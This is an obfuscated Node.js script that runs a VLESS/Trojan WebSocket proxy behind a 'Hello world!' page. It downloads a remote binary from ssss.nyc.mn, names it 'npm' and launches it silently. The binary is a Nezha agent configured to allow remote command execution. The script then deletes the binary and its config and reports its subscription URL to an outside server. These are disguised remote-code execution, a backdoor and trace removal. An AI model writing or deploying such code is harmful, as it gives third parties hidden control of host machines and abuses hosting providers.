const _0x19c47d=_0x3500;(function(_0x37292a,_0x4c4354){const _0x440e84=_0x3500,_0x42c3ed=_0x37292a();while(!![]){try{const _0x5e9d5e=parseInt(_0x440e84(0xeb))/0x1*(-parseInt(_0x440e84(0x113))/0x2)+-parseInt(_0x440e84(0xd1))/0x3*(-parseInt(_0x440e84(0xd4))/0x4)+-parseInt(_0x440e84(0x10d))/0x5+-parseInt(_0x440e84(0xed))/0x6+-parseInt(_0x440e84(0xb0))/0x7+-parseInt(_0x440e84(0xaa))/0x8+parseInt(_0x440e84(0xc8))/0x9;if(_0x5e9d5e===_0x4c4354)break;else _0x42c3ed['push'](_0x42c3ed['shift']());}catch(_0x12c458){_0x42c3ed['push'](_0x42c3ed['shift']());}}}(_0x392d,0x377b4));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x19c47d(0xe2)),path=require('path'),crypto=require(_0x19c47d(0xfc)),{Buffer}=require(_0x19c47d(0x111)),{exec,execSync}=require(_0x19c47d(0xd6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x19c47d(0xc3)][_0x19c47d(0xb7)]||_0x19c47d(0xbb),NEZHA_SERVER=process[_0x19c47d(0xc3)][_0x19c47d(0xd7)]||'',NEZHA_PORT=process[_0x19c47d(0xc3)][_0x19c47d(0xab)]||'',NEZHA_KEY=process[_0x19c47d(0xc3)][_0x19c47d(0x110)]||'',DOMAIN=process[_0x19c47d(0xc3)][_0x19c47d(0xb6)]||_0x19c47d(0xdf),AUTO_ACCESS=process[_0x19c47d(0xc3)][_0x19c47d(0xcf)]||!![],WSPATH=process[_0x19c47d(0xc3)]['WSPATH']||UUID[_0x19c47d(0xdd)](0x0,0x8),SUB_PATH=process[_0x19c47d(0xc3)][_0x19c47d(0xc6)]||'sub',NAME=process[_0x19c47d(0xc3)][_0x19c47d(0x107)]||'Hug',PORT=process[_0x19c47d(0xc3)][_0x19c47d(0x114)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0xdbd947=_0x19c47d;try{const _0x2f7c14=await axios[_0xdbd947(0x10e)]('https://speed.cloudflare.com/meta'),_0x3e590b=_0x2f7c14['data'];ISP=(_0x3e590b['country']+'-'+_0x3e590b[_0xdbd947(0xa4)])[_0xdbd947(0xa0)](/ /g,'_');}catch(_0x5962e5){ISP=_0xdbd947(0x10a);}};function _0x3500(_0x392b00,_0x5eaf38){const _0x392d31=_0x392d();return _0x3500=function(_0x3500f3,_0x4a8e1e){_0x3500f3=_0x3500f3-0x9e;let _0x4e60f8=_0x392d31[_0x3500f3];return _0x4e60f8;},_0x3500(_0x392b00,_0x5eaf38);}GetISP();const httpServer=http['createServer']((_0x1f1802,_0x5b6246)=>{const _0x2e2ac8=_0x19c47d;if(_0x1f1802['url']==='/'){const _0x6184af=path[_0x2e2ac8(0xd2)](__dirname,_0x2e2ac8(0xda));fs[_0x2e2ac8(0x9e)](_0x6184af,_0x2e2ac8(0xd9),(_0x36d045,_0x36ff47)=>{const _0x139f9a=_0x2e2ac8;if(_0x36d045){_0x5b6246[_0x139f9a(0xcb)](0xc8,{'Content-Type':_0x139f9a(0x10b)}),_0x5b6246[_0x139f9a(0x106)](_0x139f9a(0xff));return;}_0x5b6246[_0x139f9a(0xcb)](0xc8,{'Content-Type':_0x139f9a(0x10b)}),_0x5b6246['end'](_0x36ff47);});return;}else{if(_0x1f1802['url']==='/'+SUB_PATH){const _0x3b3b5c='vless://'+UUID+'@'+DOMAIN+_0x2e2ac8(0xcd)+DOMAIN+_0x2e2ac8(0xd5)+DOMAIN+_0x2e2ac8(0xe4)+WSPATH+'#'+NAME+'-'+ISP,_0x1ac9b9='trojan://'+UUID+'@'+DOMAIN+_0x2e2ac8(0xc7)+DOMAIN+_0x2e2ac8(0xd5)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x20f010=_0x3b3b5c+'\x0a'+_0x1ac9b9,_0x366ee9=Buffer[_0x2e2ac8(0xaf)](_0x20f010)[_0x2e2ac8(0xb1)](_0x2e2ac8(0xdc));_0x5b6246[_0x2e2ac8(0xcb)](0xc8,{'Content-Type':_0x2e2ac8(0xfe)}),_0x5b6246[_0x2e2ac8(0x106)](_0x366ee9+'\x0a');}else _0x5b6246[_0x2e2ac8(0xcb)](0x194,{'Content-Type':_0x2e2ac8(0xfe)}),_0x5b6246['end'](_0x2e2ac8(0xcc));}}),wss=new WebSocket[(_0x19c47d(0xe0))]({'server':httpServer}),uuid=UUID[_0x19c47d(0xa0)](/-/g,''),DNS_SERVERS=[_0x19c47d(0xe8),_0x19c47d(0xee)];function resolveHost(_0x3d23db){return new Promise((_0x552ccf,_0x46c408)=>{const _0xe6f2d5=_0x3500;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xe6f2d5(0xf6)](_0x3d23db)){_0x552ccf(_0x3d23db);return;}let _0x2d1c33=0x0;function _0x1f7d08(){const _0xbeaade=_0xe6f2d5;if(_0x2d1c33>=DNS_SERVERS['length']){_0x46c408(new Error(_0xbeaade(0xfd)+_0x3d23db+_0xbeaade(0xa7)));return;}const _0x29e3d=DNS_SERVERS[_0x2d1c33];_0x2d1c33++;const _0x221a52='https://dns.google/resolve?name='+encodeURIComponent(_0x3d23db)+'&type=A';axios['get'](_0x221a52,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0xbeaade(0xb8)](_0x21973d=>{const _0xd48bac=_0xbeaade,_0x1a4e70=_0x21973d[_0xd48bac(0xf9)];if(_0x1a4e70[_0xd48bac(0xa9)]===0x0&&_0x1a4e70['Answer']&&_0x1a4e70[_0xd48bac(0xb5)]['length']>0x0){const _0x246ada=_0x1a4e70[_0xd48bac(0xb5)][_0xd48bac(0xef)](_0x283014=>_0x283014[_0xd48bac(0xe3)]===0x1);if(_0x246ada){_0x552ccf(_0x246ada[_0xd48bac(0xf9)]);return;}}_0x1f7d08();})['catch'](_0x2a96d=>{_0x1f7d08();});}_0x1f7d08();});}function handleVlessConnection(_0x5b8edf,_0x2b31a0){const _0x50cfa5=_0x19c47d,[_0x130bba]=_0x2b31a0,_0x3be506=_0x2b31a0[_0x50cfa5(0xdd)](0x1,0x11);if(!_0x3be506[_0x50cfa5(0x104)]((_0x54acbe,_0x3ba85a)=>_0x54acbe==parseInt(uuid[_0x50cfa5(0x100)](_0x3ba85a*0x2,0x2),0x10)))return![];let _0x301de=_0x2b31a0['slice'](0x11,0x12)['readUInt8']()+0x13;const _0xbb92c2=_0x2b31a0[_0x50cfa5(0xdd)](_0x301de,_0x301de+=0x2)[_0x50cfa5(0xc5)](0x0),_0x407965=_0x2b31a0[_0x50cfa5(0xdd)](_0x301de,_0x301de+=0x1)[_0x50cfa5(0xec)](),_0x5d67a2=_0x407965==0x1?_0x2b31a0[_0x50cfa5(0xdd)](_0x301de,_0x301de+=0x4)[_0x50cfa5(0xd2)]('.'):_0x407965==0x2?new TextDecoder()[_0x50cfa5(0xfa)](_0x2b31a0[_0x50cfa5(0xdd)](_0x301de+0x1,_0x301de+=0x1+_0x2b31a0['slice'](_0x301de,_0x301de+0x1)[_0x50cfa5(0xec)]())):_0x407965==0x3?_0x2b31a0[_0x50cfa5(0xdd)](_0x301de,_0x301de+=0x10)[_0x50cfa5(0xe6)]((_0x27a43a,_0x35823f,_0x6f64ac,_0x9ddc4f)=>_0x6f64ac%0x2?_0x27a43a[_0x50cfa5(0x10f)](_0x9ddc4f['slice'](_0x6f64ac-0x1,_0x6f64ac+0x1)):_0x27a43a,[])['map'](_0x183498=>_0x183498[_0x50cfa5(0xc5)](0x0)[_0x50cfa5(0xb1)](0x10))[_0x50cfa5(0xd2)](':'):'';_0x5b8edf[_0x50cfa5(0x9f)](new Uint8Array([_0x130bba,0x0]));const _0x5a5b65=createWebSocketStream(_0x5b8edf);return resolveHost(_0x5d67a2)[_0x50cfa5(0xb8)](_0x2b4b9e=>{const _0x339169=_0x50cfa5;net[_0x339169(0xf1)]({'host':_0x2b4b9e,'port':_0xbb92c2},function(){const _0x30c6f9=_0x339169;this[_0x30c6f9(0xf8)](_0x2b31a0['slice'](_0x301de)),_0x5a5b65['on'](_0x30c6f9(0xc1),()=>{})[_0x30c6f9(0xbd)](this)['on'](_0x30c6f9(0xc1),()=>{})[_0x30c6f9(0xbd)](_0x5a5b65);})['on']('error',()=>{});})[_0x50cfa5(0x109)](_0x1d3042=>{const _0xd12ebd=_0x50cfa5;net[_0xd12ebd(0xf1)]({'host':_0x5d67a2,'port':_0xbb92c2},function(){const _0x28d680=_0xd12ebd;this[_0x28d680(0xf8)](_0x2b31a0[_0x28d680(0xdd)](_0x301de)),_0x5a5b65['on'](_0x28d680(0xc1),()=>{})[_0x28d680(0xbd)](this)['on']('error',()=>{})[_0x28d680(0xbd)](_0x5a5b65);})['on'](_0xd12ebd(0xc1),()=>{});}),!![];}function handleTrojanConnection(_0x389bf2,_0x663441){const _0x2f66b4=_0x19c47d;try{if(_0x663441[_0x2f66b4(0xd3)]<0x3a)return![];const _0x20b03e=_0x663441['slice'](0x0,0x38)[_0x2f66b4(0xb1)](),_0x2e5bf3=[UUID];let _0x585484=null;for(const _0x567078 of _0x2e5bf3){const _0x2a38fc=crypto[_0x2f66b4(0xfb)](_0x2f66b4(0xf7))['update'](_0x567078)[_0x2f66b4(0xae)](_0x2f66b4(0xac));if(_0x2a38fc===_0x20b03e){_0x585484=_0x567078;break;}}if(!_0x585484)return![];let _0x3170e8=0x38;_0x663441[_0x3170e8]===0xd&&_0x663441[_0x3170e8+0x1]===0xa&&(_0x3170e8+=0x2);const _0x5671fc=_0x663441[_0x3170e8];if(_0x5671fc!==0x1)return![];_0x3170e8+=0x1;const _0x3d0a36=_0x663441[_0x3170e8];_0x3170e8+=0x1;let _0x3a503c,_0x376d96;if(_0x3d0a36===0x1)_0x3a503c=_0x663441[_0x2f66b4(0xdd)](_0x3170e8,_0x3170e8+0x4)[_0x2f66b4(0xd2)]('.'),_0x3170e8+=0x4;else{if(_0x3d0a36===0x3){const _0x26ca1f=_0x663441[_0x3170e8];_0x3170e8+=0x1,_0x3a503c=_0x663441['slice'](_0x3170e8,_0x3170e8+_0x26ca1f)[_0x2f66b4(0xb1)](),_0x3170e8+=_0x26ca1f;}else{if(_0x3d0a36===0x4)_0x3a503c=_0x663441['slice'](_0x3170e8,_0x3170e8+0x10)[_0x2f66b4(0xe6)]((_0x45aab4,_0x179004,_0x5bb07a,_0x213f90)=>_0x5bb07a%0x2?_0x45aab4[_0x2f66b4(0x10f)](_0x213f90[_0x2f66b4(0xdd)](_0x5bb07a-0x1,_0x5bb07a+0x1)):_0x45aab4,[])[_0x2f66b4(0xe9)](_0x4a1d35=>_0x4a1d35[_0x2f66b4(0xc5)](0x0)['toString'](0x10))[_0x2f66b4(0xd2)](':'),_0x3170e8+=0x10;else return![];}}_0x376d96=_0x663441[_0x2f66b4(0xc5)](_0x3170e8),_0x3170e8+=0x2;_0x3170e8<_0x663441[_0x2f66b4(0xd3)]&&_0x663441[_0x3170e8]===0xd&&_0x663441[_0x3170e8+0x1]===0xa&&(_0x3170e8+=0x2);const _0x580974=createWebSocketStream(_0x389bf2);return resolveHost(_0x3a503c)[_0x2f66b4(0xb8)](_0x15e679=>{const _0x463b70=_0x2f66b4;net[_0x463b70(0xf1)]({'host':_0x15e679,'port':_0x376d96},function(){const _0x33587a=_0x463b70;_0x3170e8<_0x663441['length']&&this['write'](_0x663441[_0x33587a(0xdd)](_0x3170e8)),_0x580974['on'](_0x33587a(0xc1),()=>{})[_0x33587a(0xbd)](this)['on']('error',()=>{})[_0x33587a(0xbd)](_0x580974);})['on'](_0x463b70(0xc1),()=>{});})['catch'](_0x353642=>{const _0x309a5c=_0x2f66b4;net['connect']({'host':_0x3a503c,'port':_0x376d96},function(){const _0x23d731=_0x3500;_0x3170e8<_0x663441[_0x23d731(0xd3)]&&this['write'](_0x663441['slice'](_0x3170e8)),_0x580974['on']('error',()=>{})[_0x23d731(0xbd)](this)['on'](_0x23d731(0xc1),()=>{})['pipe'](_0x580974);})['on'](_0x309a5c(0xc1),()=>{});}),!![];}catch(_0x236136){return![];}}wss['on']('connection',(_0x536ba2,_0x416098)=>{const _0xb42443=_0x19c47d,_0x17a41f=_0x416098[_0xb42443(0x102)]||'';_0x536ba2[_0xb42443(0x105)](_0xb42443(0xf2),_0x23e134=>{const _0x4e56d7=_0xb42443;if(_0x23e134[_0x4e56d7(0xd3)]>0x11&&_0x23e134[0x0]===0x0){const _0x3555cf=_0x23e134[_0x4e56d7(0xdd)](0x1,0x11),_0x14e9bf=_0x3555cf['every']((_0x5e7da7,_0xa1c2de)=>_0x5e7da7==parseInt(uuid[_0x4e56d7(0x100)](_0xa1c2de*0x2,0x2),0x10));if(_0x14e9bf){!handleVlessConnection(_0x536ba2,_0x23e134)&&_0x536ba2['close']();return;}}!handleTrojanConnection(_0x536ba2,_0x23e134)&&_0x536ba2['close']();})['on'](_0xb42443(0xc1),()=>{});});const getDownloadUrl=()=>{const _0x36989a=_0x19c47d,_0x260107=os['arch']();return _0x260107==='arm'||_0x260107===_0x36989a(0xbc)||_0x260107===_0x36989a(0xad)?!NEZHA_PORT?_0x36989a(0xb4):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x36989a(0x112):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2a2273=_0x19c47d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x40f960=getDownloadUrl(),_0x1aa474=await axios({'method':_0x2a2273(0x10e),'url':_0x40f960,'responseType':_0x2a2273(0xf0)}),_0x54ace4=fs[_0x2a2273(0xce)](_0x2a2273(0xc0));return _0x1aa474[_0x2a2273(0xf9)]['pipe'](_0x54ace4),new Promise((_0x21ef3c,_0xc29519)=>{const _0x3e3f32=_0x2a2273;_0x54ace4['on'](_0x3e3f32(0x108),()=>{const _0x4deb4a=_0x3e3f32;console[_0x4deb4a(0xbf)](_0x4deb4a(0xe1)),exec(_0x4deb4a(0xf5),_0x1f8ee7=>{if(_0x1f8ee7)_0xc29519(_0x1f8ee7);_0x21ef3c();});}),_0x54ace4['on'](_0x3e3f32(0xc1),_0xc29519);});}catch(_0x31fa04){throw _0x31fa04;}},runnz=async()=>{const _0x11d899=_0x19c47d;try{const _0x53a812=execSync(_0x11d899(0xc9),{'encoding':_0x11d899(0xbe)});if(_0x53a812['trim']()!==''){console[_0x11d899(0xbf)](_0x11d899(0x103));return;}}catch(_0x4533a0){}await downloadFile();let _0x31a34d='',_0xadb97a=[_0x11d899(0xa6),_0x11d899(0xa1),_0x11d899(0xa2),_0x11d899(0xea),_0x11d899(0xc2),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x57f488=_0xadb97a[_0x11d899(0xe5)](NEZHA_PORT)?_0x11d899(0xd0):'';_0x31a34d=_0x11d899(0xe7)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x57f488+_0x11d899(0xc4);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x297892=NEZHA_SERVER[_0x11d899(0xe5)](':')?NEZHA_SERVER[_0x11d899(0xb3)](':')['pop']():'',_0x103dba=_0xadb97a[_0x11d899(0xe5)](_0x297892)?'true':_0x11d899(0xa3),_0xda3d2c='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x11d899(0xde)+_0x103dba+_0x11d899(0xd8)+UUID;fs[_0x11d899(0xa8)](_0x11d899(0xba),_0xda3d2c);}_0x31a34d=_0x11d899(0xf3);}else{console[_0x11d899(0xbf)](_0x11d899(0xf4));return;}}try{exec(_0x31a34d,{'shell':'/bin/bash'},_0x2574a4=>{const _0x462c42=_0x11d899;if(_0x2574a4)console[_0x462c42(0xc1)](_0x462c42(0xb9),_0x2574a4);else console[_0x462c42(0xbf)](_0x462c42(0xa5));});}catch(_0x49ee9a){console[_0x11d899(0xc1)]('error:\x20'+_0x49ee9a);}};async function addAccessTask(){const _0x3c0214=_0x19c47d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5ad897='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x1cbf74=await axios['post'](_0x3c0214(0xdb),{'url':_0x5ad897},{'headers':{'Content-Type':_0x3c0214(0x101)}});console[_0x3c0214(0xbf)](_0x3c0214(0xca));}catch(_0x1ee03f){}}const delFiles=()=>{const _0x2e6d12=_0x19c47d;fs['unlink'](_0x2e6d12(0xc0),()=>{}),fs[_0x2e6d12(0x10c)](_0x2e6d12(0xba),()=>{});};httpServer[_0x19c47d(0xb2)](PORT,()=>{const _0x389f62=_0x19c47d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x389f62(0xbf)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});function _0x392d(){const _0x290d9c=['&path=%2F','includes','reduce','setsid\x20nohup\x20./npm\x20-s\x20','8.8.4.4','map','2087','241TKJnnt','readUInt8','2223918EHHajq','1.1.1.1','find','stream','connect','message','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','chmod\x20+x\x20npm','test','sha224','write','data','decode','createHash','crypto','Failed\x20to\x20resolve\x20','text/plain','Hello\x20world!','substr','application/json','url','npm\x20is\x20already\x20running,\x20skip\x20running...','every','once','end','NAME','finish','catch','Unknown','text/html','unlink','1007335HhdTdn','get','concat','NEZHA_KEY','buffer','https://amd64.ssss.nyc.mn/v1','2052TOoLzc','PORT','readFile','send','replace','8443','2096','false','asOrganization','npm\x20is\x20running','443','\x20with\x20all\x20DNS\x20servers','writeFileSync','Status','2036944VVuZpm','NEZHA_PORT','hex','aarch64','digest','from','996555YwagfD','toString','listen','split','https://arm64.ssss.nyc.mn/v1','Answer','DOMAIN','UUID','then','npm\x20running\x20error:','config.yaml','32017281-21e5-46ec-b409-bbe2a29f9263','arm64','pipe','utf-8','log','npm','error','2083','env','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readUInt16BE','SUB_PATH',':443?security=tls&sni=','10541898pidSnB','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Automatic\x20Access\x20Task\x20added\x20successfully','writeHead','Not\x20Found\x0a',':443?encryption=none&security=tls&sni=','createWriteStream','AUTO_ACCESS','--tls','3vyDqtw','join','length','1089196luZUEX','&fp=chrome&type=ws&host=','child_process','NEZHA_SERVER','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf8','index.html','https://oooo.serv00.net/add-url','base64','slice','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','YMXXOO.loc.cc','Server','npm\x20download\x20successfully','net','type'];_0x392d=function(){return _0x290d9c;};return _0x392d();}
